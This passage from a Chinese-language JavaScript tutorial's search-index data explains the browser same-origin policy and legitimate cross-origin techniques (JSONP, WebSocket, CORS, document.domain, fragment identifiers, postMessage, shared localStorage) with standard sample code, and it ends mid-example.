\u670d\u52a1\u5668\u6536\u5230\u8fd9\u4e2a\u8bf7\u6c42\u4ee5\u540e\uff0c\u4f1a\u5c06\u6570\u636e\u653e\u5728\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u4f4d\u7f6e\u8fd4\u56de\u3002 1 2 3 foo ({ 'ip' : '8.8.8.8' }); \u7531\u4e8e <script> \u5143\u7d20\u8bf7\u6c42\u7684\u811a\u672c\uff0c\u76f4\u63a5\u4f5c\u4e3a\u4ee3\u7801\u8fd0\u884c\u3002\u8fd9\u65f6\uff0c\u53ea\u8981\u6d4f\u89c8\u5668\u5b9a\u4e49\u4e86 foo \u51fd\u6570\uff0c\u8be5\u51fd\u6570\u5c31\u4f1a\u7acb\u5373\u8c03\u7528\u3002\u4f5c\u4e3a\u53c2\u6570\u7684 JSON \u6570\u636e\u88ab\u89c6\u4e3a JavaScript \u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u907f\u514d\u4e86\u4f7f\u7528 JSON.parse \u7684\u6b65\u9aa4\u3002 WebSocket \u00b6 WebSocket \u662f\u4e00\u79cd\u901a\u4fe1\u534f\u8bae\uff0c\u4f7f\u7528 ws:// \uff08\u975e\u52a0\u5bc6\uff09\u548c wss:// \uff08\u52a0\u5bc6\uff09\u4f5c\u4e3a\u534f\u8bae\u524d\u7f00\u3002\u8be5\u534f\u8bae\u4e0d\u5b9e\u884c\u540c\u6e90\u653f\u7b56\uff0c\u53ea\u8981\u670d\u52a1\u5668\u652f\u6301\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u5b83\u8fdb\u884c\u8de8\u6e90\u901a\u4fe1\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6d4f\u89c8\u5668\u53d1\u51fa\u7684 WebSocket \u8bf7\u6c42\u7684\u5934\u4fe1\u606f\uff08\u6458\u81ea \u7ef4\u57fa\u767e\u79d1 \uff09\u3002 1 2 3 4 5 6 7 8 GET /chat HTTP / 1.1 Host : server.example.com Upgrade : websocket Connection : Upgrade Sec-WebSocket-Key : x3JJHMbDL1EzLkh9GBhXDw== Sec-WebSocket-Protocol : chat, superchat Sec-WebSocket-Version : 13 Origin : http://example.com \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6709\u4e00\u4e2a\u5b57\u6bb5\u662f Origin \uff0c\u8868\u793a\u8be5\u8bf7\u6c42\u7684\u8bf7\u6c42\u6e90\uff08origin\uff09\uff0c\u5373\u53d1\u81ea\u54ea\u4e2a\u57df\u540d\u3002 \u6b63\u662f\u56e0\u4e3a\u6709\u4e86 Origin \u8fd9\u4e2a\u5b57\u6bb5\uff0c\u6240\u4ee5 WebSocket \u624d\u6ca1\u6709\u5b9e\u884c\u540c\u6e90\u653f\u7b56\u3002\u56e0\u4e3a\u670d\u52a1\u5668\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u5b57\u6bb5\uff0c\u5224\u65ad\u662f\u5426\u8bb8\u53ef\u672c\u6b21\u901a\u4fe1\u3002\u5982\u679c\u8be5\u57df\u540d\u5728\u767d\u540d\u5355\u5185\uff0c\u670d\u52a1\u5668\u5c31\u4f1a\u505a\u51fa\u5982\u4e0b\u56de\u5e94\u3002 1 2 3 4 5 HTTP / 1.1 101 Switching Protocols Upgrade : websocket Connection : Upgrade Sec-WebSocket-Accept : HSmrc0sMlYUkAGmm5OPpG2HaGWk= Sec-WebSocket-Protocol : chat CORS \u00b6 CORS \u662f\u8de8\u6e90\u8d44\u6e90\u5206\u4eab\uff08Cross-Origin Resource Sharing\uff09\u7684\u7f29\u5199\u3002\u5b83\u662f W3C \u6807\u51c6\uff0c\u5c5e\u4e8e\u8de8\u6e90 AJAX \u8bf7\u6c42\u7684\u6839\u672c\u89e3\u51b3\u65b9\u6cd5\u3002\u76f8\u6bd4 JSONP \u53ea\u80fd\u53d1 GET \u8bf7\u6c42\uff0cCORS \u5141\u8bb8\u4efb\u4f55\u7c7b\u578b\u7684\u8bf7\u6c42\u3002 \u4e0b\u4e00\u7ae0\u5c06\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u5982\u4f55\u901a\u8fc7 CORS \u5b8c\u6210\u8de8\u6e90 AJAX \u8bf7\u6c42\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Mozilla Developer Network, Window.postMessage Jakub Jankiewicz, Cross-Domain LocalStorage David Baron, setTimeout with a shorter delay : \u5229\u7528 window.postMessage \u53ef\u4ee5\u5b9e\u73b00\u6beb\u79d2\u89e6\u53d1\u56de\u8c03\u51fd\u6570","title":"\u540c\u6e90\u9650\u5236"},{"location":"bom/same-origin/#_1","text":"\u6d4f\u89c8\u5668\u5b89\u5168\u7684\u57fa\u77f3\u662f\u201c\u540c\u6e90\u653f\u7b56\u201d\uff08 same-origin policy \uff09\u3002\u5f88\u591a\u5f00\u53d1\u8005\u90fd\u77e5\u9053\u8fd9\u4e00\u70b9\uff0c\u4f46\u4e86\u89e3\u5f97\u4e0d\u5168\u9762\u3002","title":"\u540c\u6e90\u9650\u5236"},{"location":"bom/same-origin/#_2","text":"","title":"\u6982\u8ff0"},{"location":"bom/same-origin/#_3","text":"1995\u5e74\uff0c\u540c\u6e90\u653f\u7b56\u7531 Netscape \u516c\u53f8\u5f15\u5165\u6d4f\u89c8\u5668\u3002\u76ee\u524d\uff0c\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u5b9e\u884c\u8fd9\u4e2a\u653f\u7b56\u3002 \u6700\u521d\uff0c\u5b83\u7684\u542b\u4e49\u662f\u6307\uff0cA \u7f51\u9875\u8bbe\u7f6e\u7684 Cookie\uff0cB \u7f51\u9875\u4e0d\u80fd\u6253\u5f00\uff0c\u9664\u975e\u8fd9\u4e24\u4e2a\u7f51\u9875\u201c\u540c\u6e90\u201d\u3002\u6240\u8c13\u201c\u540c\u6e90\u201d\u6307\u7684\u662f\u201c\u4e09\u4e2a\u76f8\u540c\u201d\u3002 \u534f\u8bae\u76f8\u540c \u57df\u540d\u76f8\u540c \u7aef\u53e3\u76f8\u540c\uff08\u8fd9\u70b9\u53ef\u4ee5\u5ffd\u7565\uff0c\u8be6\u89c1\u4e0b\u6587\uff09 \u4e3e\u4f8b\u6765\u8bf4\uff0c http://www.example.com/dir/page.html \u8fd9\u4e2a\u7f51\u5740\uff0c\u534f\u8bae\u662f http:// \uff0c\u57df\u540d\u662f www.example.com \uff0c\u7aef\u53e3\u662f 80 \uff08\u9ed8\u8ba4\u7aef\u53e3\u53ef\u4ee5\u7701\u7565\uff09\uff0c\u5b83\u7684\u540c\u6e90\u60c5\u51b5\u5982\u4e0b\u3002 http://www.example.com/dir2/other.html \uff1a\u540c\u6e90 http://example.com/dir/other.html \uff1a\u4e0d\u540c\u6e90\uff08\u57df\u540d\u4e0d\u540c\uff09 http://v2.www.example.com/dir/other.html \uff1a\u4e0d\u540c\u6e90\uff08\u57df\u540d\u4e0d\u540c\uff09 http://www.example.com:81/dir/other.html \uff1a\u4e0d\u540c\u6e90\uff08\u7aef\u53e3\u4e0d\u540c\uff09 https://www.example.com/dir/page.html \uff1a\u4e0d\u540c\u6e90\uff08\u534f\u8bae\u4e0d\u540c\uff09 \u6ce8\u610f\uff0c\u6807\u51c6\u89c4\u5b9a\u7aef\u53e3\u4e0d\u540c\u7684\u7f51\u5740\u4e0d\u662f\u540c\u6e90\uff08\u6bd4\u59828000\u7aef\u53e3\u548c8001\u7aef\u53e3\u4e0d\u662f\u540c\u6e90\uff09\uff0c\u4f46\u662f\u6d4f\u89c8\u5668\u6ca1\u6709\u9075\u5b88\u8fd9\u6761\u89c4\u5b9a\u3002\u5b9e\u9645\u4e0a\uff0c\u540c\u4e00\u4e2a\u7f51\u57df\u7684\u4e0d\u540c\u7aef\u53e3\uff0c\u662f\u53ef\u4ee5\u4e92\u76f8\u8bfb\u53d6 Cookie \u7684\u3002","title":"\u542b\u4e49"},{"location":"bom/same-origin/#_4","text":"\u540c\u6e90\u653f\u7b56\u7684\u76ee\u7684\uff0c\u662f\u4e3a\u4e86\u4fdd\u8bc1\u7528\u6237\u4fe1\u606f\u7684\u5b89\u5168\uff0c\u9632\u6b62\u6076\u610f\u7684\u7f51\u7ad9\u7a83\u53d6\u6570\u636e\u3002 \u8bbe\u60f3\u8fd9\u6837\u4e00\u79cd\u60c5\u51b5\uff1aA \u7f51\u7ad9\u662f\u4e00\u5bb6\u94f6\u884c\uff0c\u7528\u6237\u767b\u5f55\u4ee5\u540e\uff0cA \u7f51\u7ad9\u5728\u7528\u6237\u7684\u673a\u5668\u4e0a\u8bbe\u7f6e\u4e86\u4e00\u4e2a Cookie\uff0c\u5305\u542b\u4e86\u4e00\u4e9b\u9690\u79c1\u4fe1\u606f\u3002\u7528\u6237\u79bb\u5f00 A \u7f51\u7ad9\u4ee5\u540e\uff0c\u53c8\u53bb\u8bbf\u95ee B \u7f51\u7ad9\uff0c\u5982\u679c\u6ca1\u6709\u540c\u6e90\u9650\u5236\uff0cB \u7f51\u7ad9\u53ef\u4ee5\u8bfb\u53d6 A \u7f51\u7ad9\u7684 Cookie\uff0c\u90a3\u4e48\u9690\u79c1\u5c31\u6cc4\u6f0f\u4e86\u3002\u66f4\u53ef\u6015\u7684\u662f\uff0cCookie \u5f80\u5f80\u7528\u6765\u4fdd\u5b58\u7528\u6237\u7684\u767b\u5f55\u72b6\u6001\uff0c\u5982\u679c\u7528\u6237\u6ca1\u6709\u9000\u51fa\u767b\u5f55\uff0c\u5176\u4ed6\u7f51\u7ad9\u5c31\u53ef\u4ee5\u5192\u5145\u7528\u6237\uff0c\u4e3a\u6240\u6b32\u4e3a\u3002\u56e0\u4e3a\u6d4f\u89c8\u5668\u540c\u65f6\u8fd8\u89c4\u5b9a\uff0c\u63d0\u4ea4\u8868\u5355\u4e0d\u53d7\u540c\u6e90\u653f\u7b56\u7684\u9650\u5236\u3002 \u7531\u6b64\u53ef\u89c1\uff0c\u540c\u6e90\u653f\u7b56\u662f\u5fc5\u9700\u7684\uff0c\u5426\u5219 Cookie \u53ef\u4ee5\u5171\u4eab\uff0c\u4e92\u8054\u7f51\u5c31\u6beb\u65e0\u5b89\u5168\u53ef\u8a00\u4e86\u3002","title":"\u76ee\u7684"},{"location":"bom/same-origin/#_5","text":"\u968f\u7740\u4e92\u8054\u7f51\u7684\u53d1\u5c55\uff0c\u540c\u6e90\u653f\u7b56\u8d8a\u6765\u8d8a\u4e25\u683c\u3002\u76ee\u524d\uff0c\u5982\u679c\u975e\u540c\u6e90\uff0c\u5171\u6709\u4e09\u79cd\u884c\u4e3a\u53d7\u5230\u9650\u5236\u3002 \uff081\uff09 \u65e0\u6cd5\u8bfb\u53d6\u975e\u540c\u6e90\u7f51\u9875\u7684 Cookie\u3001LocalStorage \u548c IndexedDB\u3002 \uff082\uff09 \u65e0\u6cd5\u63a5\u89e6\u975e\u540c\u6e90\u7f51\u9875\u7684 DOM\u3002 \uff083\uff09 \u65e0\u6cd5\u5411\u975e\u540c\u6e90\u5730\u5740\u53d1\u9001 AJAX \u8bf7\u6c42\uff08\u53ef\u4ee5\u53d1\u9001\uff0c\u4f46\u6d4f\u89c8\u5668\u4f1a\u62d2\u7edd\u63a5\u53d7\u54cd\u5e94\uff09\u3002 \u53e6\u5916\uff0c\u901a\u8fc7 JavaScript \u811a\u672c\u53ef\u4ee5\u62ff\u5230\u5176\u4ed6\u7a97\u53e3\u7684 window \u5bf9\u8c61\u3002\u5982\u679c\u662f\u975e\u540c\u6e90\u7684\u7f51\u9875\uff0c\u76ee\u524d\u5141\u8bb8\u4e00\u4e2a\u7a97\u53e3\u53ef\u4ee5\u63a5\u89e6\u5176\u4ed6\u7f51\u9875\u7684 window \u5bf9\u8c61\u7684\u4e5d\u4e2a\u5c5e\u6027\u548c\u56db\u4e2a\u65b9\u6cd5\u3002 window.closed window.frames window.length window.location window.opener window.parent window.self window.top window.window window.blur() window.close() window.focus() window.postMessage() \u4e0a\u9762\u7684\u4e5d\u4e2a\u5c5e\u6027\u4e4b\u4e2d\uff0c\u53ea\u6709 window.location \u662f\u53ef\u8bfb\u5199\u7684\uff0c\u5176\u4ed6\u516b\u4e2a\u5168\u90e8\u90fd\u662f\u53ea\u8bfb\u3002\u800c\u4e14\uff0c\u5373\u4f7f\u662f location \u5bf9\u8c61\uff0c\u975e\u540c\u6e90\u7684\u60c5\u51b5\u4e0b\uff0c\u4e5f\u53ea\u5141\u8bb8\u8c03\u7528 location.replace() \u65b9\u6cd5\u548c\u5199\u5165 location.href \u5c5e\u6027\u3002 \u867d\u7136\u8fd9\u4e9b\u9650\u5236\u662f\u5fc5\u8981\u7684\uff0c\u4f46\u662f\u6709\u65f6\u5f88\u4e0d\u65b9\u4fbf\uff0c\u5408\u7406\u7684\u7528\u9014\u4e5f\u53d7\u5230\u5f71\u54cd\u3002\u4e0b\u9762\u4ecb\u7ecd\u5982\u4f55\u89c4\u907f\u4e0a\u9762\u7684\u9650\u5236\u3002","title":"\u9650\u5236\u8303\u56f4"},{"location":"bom/same-origin/#cookie","text":"Cookie \u662f\u670d\u52a1\u5668\u5199\u5165\u6d4f\u89c8\u5668\u7684\u4e00\u5c0f\u6bb5\u4fe1\u606f\uff0c\u53ea\u6709\u540c\u6e90\u7684\u7f51\u9875\u624d\u80fd\u5171\u4eab\u3002\u5982\u679c\u4e24\u4e2a\u7f51\u9875\u4e00\u7ea7\u57df\u540d\u76f8\u540c\uff0c\u53ea\u662f\u6b21\u7ea7\u57df\u540d\u4e0d\u540c\uff0c\u6d4f\u89c8\u5668\u5141\u8bb8\u901a\u8fc7\u8bbe\u7f6e document.domain \u5171\u4eab Cookie\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0cA \u7f51\u9875\u7684\u7f51\u5740\u662f http://w1.example.com/a.html \uff0cB \u7f51\u9875\u7684\u7f51\u5740\u662f http://w2.example.com/b.html \uff0c\u90a3\u4e48\u53ea\u8981\u8bbe\u7f6e\u76f8\u540c\u7684 document.domain \uff0c\u4e24\u4e2a\u7f51\u9875\u5c31\u53ef\u4ee5\u5171\u4eab Cookie\u3002\u56e0\u4e3a\u6d4f\u89c8\u5668\u901a\u8fc7 document.domain \u5c5e\u6027\u6765\u68c0\u67e5\u662f\u5426\u540c\u6e90\u3002 1 2 // \u4e24\u4e2a\u7f51\u9875\u90fd\u9700\u8981\u8bbe\u7f6e document . domain = 'example.com' ; \u6ce8\u610f\uff0cA \u548c B \u4e24\u4e2a\u7f51\u9875\u90fd\u9700\u8981\u8bbe\u7f6e document.domain \u5c5e\u6027\uff0c\u624d\u80fd\u8fbe\u5230\u540c\u6e90\u7684\u76ee\u7684\u3002\u56e0\u4e3a\u8bbe\u7f6e document.domain \u7684\u540c\u65f6\uff0c\u4f1a\u628a\u7aef\u53e3\u91cd\u7f6e\u4e3a null \uff0c\u56e0\u6b64\u5982\u679c\u53ea\u8bbe\u7f6e\u4e00\u4e2a\u7f51\u9875\u7684 document.domain \uff0c\u4f1a\u5bfc\u81f4\u4e24\u4e2a\u7f51\u5740\u7684\u7aef\u53e3\u4e0d\u540c\uff0c\u8fd8\u662f\u8fbe\u4e0d\u5230\u540c\u6e90\u7684\u76ee\u7684\u3002 \u73b0\u5728\uff0cA \u7f51\u9875\u901a\u8fc7\u811a\u672c\u8bbe\u7f6e\u4e00\u4e2a Cookie\u3002 1 document . cookie = \"test1=hello\" ; B \u7f51\u9875\u5c31\u53ef\u4ee5\u8bfb\u5230\u8fd9\u4e2a Cookie\u3002 1 var allCookie = document . cookie ; \u6ce8\u610f\uff0c\u8fd9\u79cd\u65b9\u6cd5\u53ea\u9002\u7528\u4e8e Cookie \u548c iframe \u7a97\u53e3\uff0cLocalStorage \u548c IndexedDB \u65e0\u6cd5\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\uff0c\u89c4\u907f\u540c\u6e90\u653f\u7b56\uff0c\u800c\u8981\u4f7f\u7528\u4e0b\u6587\u4ecb\u7ecd PostMessage API\u3002 \u53e6\u5916\uff0c\u670d\u52a1\u5668\u4e5f\u53ef\u4ee5\u5728\u8bbe\u7f6e Cookie \u7684\u65f6\u5019\uff0c\u6307\u5b9a Cookie \u7684\u6240\u5c5e\u57df\u540d\u4e3a\u4e00\u7ea7\u57df\u540d\uff0c\u6bd4\u5982 example.com \u3002 1 Set-Cookie: key=value; domain=example.com; path=/ \u8fd9\u6837\u7684\u8bdd\uff0c\u4e8c\u7ea7\u57df\u540d\u548c\u4e09\u7ea7\u57df\u540d\u4e0d\u7528\u505a\u4efb\u4f55\u8bbe\u7f6e\uff0c\u90fd\u53ef\u4ee5\u8bfb\u53d6\u8fd9\u4e2a Cookie\u3002","title":"Cookie"},{"location":"bom/same-origin/#iframe","text":"iframe \u5143\u7d20\u53ef\u4ee5\u5728\u5f53\u524d\u7f51\u9875\u4e4b\u4e2d\uff0c\u5d4c\u5165\u5176\u4ed6\u7f51\u9875\u3002\u6bcf\u4e2a iframe \u5143\u7d20\u5f62\u6210\u81ea\u5df1\u7684\u7a97\u53e3\uff0c\u5373\u6709\u81ea\u5df1\u7684 window \u5bf9\u8c61\u3002 iframe \u7a97\u53e3\u4e4b\u4e2d\u7684\u811a\u672c\uff0c\u53ef\u4ee5\u83b7\u5f97\u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u3002\u4f46\u662f\uff0c\u53ea\u6709\u5728\u540c\u6e90\u7684\u60c5\u51b5\u4e0b\uff0c\u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u624d\u80fd\u901a\u4fe1\uff1b\u5982\u679c\u8de8\u57df\uff0c\u5c31\u65e0\u6cd5\u62ff\u5230\u5bf9\u65b9\u7684 DOM\u3002 \u6bd4\u5982\uff0c\u7236\u7a97\u53e3\u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u5982\u679c iframe \u7a97\u53e3\u4e0d\u662f\u540c\u6e90\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 document . getElementById ( \"myIFrame\" ) . contentWindow . document // Uncaught DOMException: Blocked a frame from accessing a cross-origin frame. \u4e0a\u9762\u547d\u4ee4\u4e2d\uff0c\u7236\u7a97\u53e3\u60f3\u83b7\u53d6\u5b50\u7a97\u53e3\u7684 DOM\uff0c\u56e0\u4e3a\u8de8\u57df\u5bfc\u81f4\u62a5\u9519\u3002 \u53cd\u4e4b\u4ea6\u7136\uff0c\u5b50\u7a97\u53e3\u83b7\u53d6\u4e3b\u7a97\u53e3\u7684 DOM \u4e5f\u4f1a\u62a5\u9519\u3002 1 2 window . parent . document . body // \u62a5\u9519 \u8fd9\u79cd\u60c5\u51b5\u4e0d\u4ec5\u9002\u7528\u4e8e iframe \u7a97\u53e3\uff0c\u8fd8\u9002\u7528\u4e8e window.open \u65b9\u6cd5\u6253\u5f00\u7684\u7a97\u53e3\uff0c\u53ea\u8981\u8de8\u57df\uff0c\u7236\u7a97\u53e3\u4e0e\u5b50\u7a97\u53e3\u4e4b\u95f4\u5c31\u65e0\u6cd5\u901a\u4fe1\u3002 \u5982\u679c\u4e24\u4e2a\u7a97\u53e3\u4e00\u7ea7\u57df\u540d\u76f8\u540c\uff0c\u53ea\u662f\u4e8c\u7ea7\u57df\u540d\u4e0d\u540c\uff0c\u90a3\u4e48\u8bbe\u7f6e\u4e0a\u4e00\u8282\u4ecb\u7ecd\u7684 document.domain \u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u89c4\u907f\u540c\u6e90\u653f\u7b56\uff0c\u62ff\u5230 DOM\u3002 \u5bf9\u4e8e\u5b8c\u5168\u4e0d\u540c\u6e90\u7684\u7f51\u7ad9\uff0c\u76ee\u524d\u6709\u4e24\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u89e3\u51b3\u8de8\u57df\u7a97\u53e3\u7684\u901a\u4fe1\u95ee\u9898\u3002 \u7247\u6bb5\u8bc6\u522b\u7b26\uff08fragment identifier\uff09 \u8de8\u6587\u6863\u901a\u4fe1API\uff08Cross-document messaging\uff09","title":"iframe \u548c\u591a\u7a97\u53e3\u901a\u4fe1"},{"location":"bom/same-origin/#_6","text":"\u7247\u6bb5\u6807\u8bc6\u7b26\uff08fragment identifier\uff09\u6307\u7684\u662f\uff0cURL \u7684 # \u53f7\u540e\u9762\u7684\u90e8\u5206\uff0c\u6bd4\u5982 http://example.com/x.html#fragment \u7684 #fragment \u3002\u5982\u679c\u53ea\u662f\u6539\u53d8\u7247\u6bb5\u6807\u8bc6\u7b26\uff0c\u9875\u9762\u4e0d\u4f1a\u91cd\u65b0\u5237\u65b0\u3002 \u7236\u7a97\u53e3\u53ef\u4ee5\u628a\u4fe1\u606f\uff0c\u5199\u5165\u5b50\u7a97\u53e3\u7684\u7247\u6bb5\u6807\u8bc6\u7b26\u3002 1 2 var src = originURL + '#' + data ; document . getElementById ( 'myIFrame' ). src = src ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7236\u7a97\u53e3\u628a\u6240\u8981\u4f20\u9012\u7684\u4fe1\u606f\uff0c\u5199\u5165 iframe \u7a97\u53e3\u7684\u7247\u6bb5\u6807\u8bc6\u7b26\u3002 \u5b50\u7a97\u53e3\u901a\u8fc7\u76d1\u542c hashchange \u4e8b\u4ef6\u5f97\u5230\u901a\u77e5\u3002 1 2 3 4 5 6 window . onhashchange = checkMessage ; function checkMessage () { var message = window . location . hash ; // ... } \u540c\u6837\u7684\uff0c\u5b50\u7a97\u53e3\u4e5f\u53ef\u4ee5\u6539\u53d8\u7236\u7a97\u53e3\u7684\u7247\u6bb5\u6807\u8bc6\u7b26\u3002 1 parent . location . href = target + '#' + hash ;","title":"\u7247\u6bb5\u8bc6\u522b\u7b26"},{"location":"bom/same-origin/#windowpostmessage","text":"\u4e0a\u9762\u7684\u8fd9\u79cd\u65b9\u6cd5\u5c5e\u4e8e\u7834\u89e3\uff0cHTML5 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5f15\u5165\u4e86\u4e00\u4e2a\u5168\u65b0\u7684API\uff1a\u8de8\u6587\u6863\u901a\u4fe1 API\uff08Cross-document messaging\uff09\u3002 \u8fd9\u4e2a API \u4e3a window \u5bf9\u8c61\u65b0\u589e\u4e86\u4e00\u4e2a window.postMessage \u65b9\u6cd5\uff0c\u5141\u8bb8\u8de8\u7a97\u53e3\u901a\u4fe1\uff0c\u4e0d\u8bba\u8fd9\u4e24\u4e2a\u7a97\u53e3\u662f\u5426\u540c\u6e90\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u7236\u7a97\u53e3 aaa.com \u5411\u5b50\u7a97\u53e3 bbb.com \u53d1\u6d88\u606f\uff0c\u8c03\u7528 postMessage \u65b9\u6cd5\u5c31\u53ef\u4ee5\u4e86\u3002 1 2 3 4 // \u7236\u7a97\u53e3\u6253\u5f00\u4e00\u4e2a\u5b50\u7a97\u53e3 var popup = window . open ( 'http://bbb.com' , 'title' ); // \u7236\u7a97\u53e3\u5411\u5b50\u7a97\u53e3\u53d1\u6d88\u606f popup . postMessage ( 'Hello World!' , 'http://bbb.com' ); postMessage \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5177\u4f53\u7684\u4fe1\u606f\u5185\u5bb9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u63a5\u6536\u6d88\u606f\u7684\u7a97\u53e3\u7684\u6e90\uff08origin\uff09\uff0c\u5373\u201c\u534f\u8bae + \u57df\u540d + \u7aef\u53e3\u201d\u3002\u4e5f\u53ef\u4ee5\u8bbe\u4e3a * \uff0c\u8868\u793a\u4e0d\u9650\u5236\u57df\u540d\uff0c\u5411\u6240\u6709\u7a97\u53e3\u53d1\u9001\u3002 \u5b50\u7a97\u53e3\u5411\u7236\u7a97\u53e3\u53d1\u9001\u6d88\u606f\u7684\u5199\u6cd5\u7c7b\u4f3c\u3002 1 2 // \u5b50\u7a97\u53e3\u5411\u7236\u7a97\u53e3\u53d1\u6d88\u606f window . opener . postMessage ( 'Nice to see you' , 'http://aaa.com' ); \u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u90fd\u53ef\u4ee5\u901a\u8fc7 message \u4e8b\u4ef6\uff0c\u76d1\u542c\u5bf9\u65b9\u7684\u6d88\u606f\u3002 1 2 3 4 5 // \u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u90fd\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\uff0c // \u76d1\u542c message \u6d88\u606f window . addEventListener ( 'message' , function ( e ) { console . log ( e . data ); }, false ); message \u4e8b\u4ef6\u7684\u53c2\u6570\u662f\u4e8b\u4ef6\u5bf9\u8c61 event \uff0c\u63d0\u4f9b\u4ee5\u4e0b\u4e09\u4e2a\u5c5e\u6027\u3002 event.source \uff1a\u53d1\u9001\u6d88\u606f\u7684\u7a97\u53e3 event.origin : \u6d88\u606f\u53d1\u5411\u7684\u7f51\u5740 event.data : \u6d88\u606f\u5185\u5bb9 \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\uff0c\u5b50\u7a97\u53e3\u901a\u8fc7 event.source \u5c5e\u6027\u5f15\u7528\u7236\u7a97\u53e3\uff0c\u7136\u540e\u53d1\u9001\u6d88\u606f\u3002 1 2 3 4 window . addEventListener ( 'message' , receiveMessage ); function receiveMessage ( event ) { event . source . postMessage ( 'Nice to see you!' , '*' ); } \u4e0a\u9762\u4ee3\u7801\u6709\u51e0\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\u3002\u9996\u5148\uff0c receiveMessage \u51fd\u6570\u91cc\u9762\u6ca1\u6709\u8fc7\u6ee4\u4fe1\u606f\u7684\u6765\u6e90\uff0c\u4efb\u610f\u7f51\u5740\u53d1\u6765\u7684\u4fe1\u606f\u90fd\u4f1a\u88ab\u5904\u7406\u3002\u5176\u6b21\uff0c postMessage \u65b9\u6cd5\u4e2d\u6307\u5b9a\u7684\u76ee\u6807\u7a97\u53e3\u7684\u7f51\u5740\u662f\u4e00\u4e2a\u661f\u53f7\uff0c\u8868\u793a\u8be5\u4fe1\u606f\u53ef\u4ee5\u5411\u4efb\u610f\u7f51\u5740\u53d1\u9001\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u4e24\u79cd\u505a\u6cd5\u662f\u4e0d\u63a8\u8350\u7684\uff0c\u56e0\u4e3a\u4e0d\u591f\u5b89\u5168\uff0c\u53ef\u80fd\u4f1a\u88ab\u6076\u610f\u5229\u7528\u3002 event.origin \u5c5e\u6027\u53ef\u4ee5\u8fc7\u6ee4\u4e0d\u662f\u53d1\u7ed9\u672c\u7a97\u53e3\u7684\u6d88\u606f\u3002 1 2 3 4 5 6 7 8 9 window . addEventListener ( 'message' , receiveMessage ); function receiveMessage ( event ) { if ( event . origin !== 'http://aaa.com' ) return ; if ( event . data === 'Hello World' ) { event . source . postMessage ( 'Hello' , event . origin ); } else { console . log ( event . data ); } }","title":"window.postMessage()"},{"location":"bom/same-origin/#localstorage","text":"\u901a\u8fc7 window.postMessage \uff0c\u8bfb\u5199\u5176\u4ed6\u7a97\u53e3\u7684 LocalStorage \u4e5f\u6210\u4e3a\u4e86\u53ef\u80fd\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4e3b\u7a97\u53e3\u5199\u5165 iframe \u5b50\u7a97\u53e3\u7684 localStorage \u3002 1 2 3 4 5 6 7 window . onmessage = function ( e ) { if ( e . origin !== 'http://bbb.com' ) { return ; } var payload = JSON . parse ( e . data ); localStorage . setItem ( payload . key , JSON . stringify ( payload . data )); }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7a97\u53e3\u5c06\u7236\u7a97\u53e3\u53d1\u6765\u7684\u6d88\u606f\uff0c\u5199\u5165\u81ea\u5df1\u7684 LocalStorage\u3002 \u7236\u7a97\u53e3\u53d1\u9001\u6d88\u606f\u7684\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 var win = document . getElementsByTagName ( 'iframe' )[ 0 ]. contentWindow ; var obj = { name : 'Jack' }; win . postMessage ( JSON . stringify ({ key : 'storage' , data : obj }), 'http://bbb.com' ); \u52a0\u5f3a\u7248\u7684\u5b50\u7a97\u53e3\u63a5\u6536\u6d88\u606f\u7684\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 window . onmessage = function ( e ) { if ( e . origin !== 'http://bbb.com' ) return ; var payload = JSON . parse ( e . data ); switch ( payload . method ) { case 'set' : localStorage . setItem ( payload . key , JSON . stringify ( payload . data )); break ; case 'get' : var parent = window . parent ; var data = localStorage . getItem ( payload . key ); parent . postMessage ( data , 'http://aaa.com' ); break ; case 'remove' : localStorage . removeItem ( payload . key ); break ; } }; \u52a0\u5f3a\u7248\u7684\u7236\u7a97\u53e3\u53d1\u9001\u6d88\u606f\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var win = document . getElementsByTagName ( 'iframe' )[ 0 ]. contentWindow ; var obj = { name : 'Jack' }; // \u5b58\u5165\u5bf9\u8c61 win . postMessage ( JSON . stringify ({ key : 'storage' , method : 'set' , data : obj }), 'http://bbb.com' ); // \u8bfb\u53d6\u5bf9\u8c61 win . postMessage ( JSON . stringify ({ key : 'storage' , method : \"get\" }), \"*\" ); window . onmessage = function ( e ) { if ( e . origin != 'http://aaa.com' ) return ; console . log ( JSON . parse ( e . data ). name ); 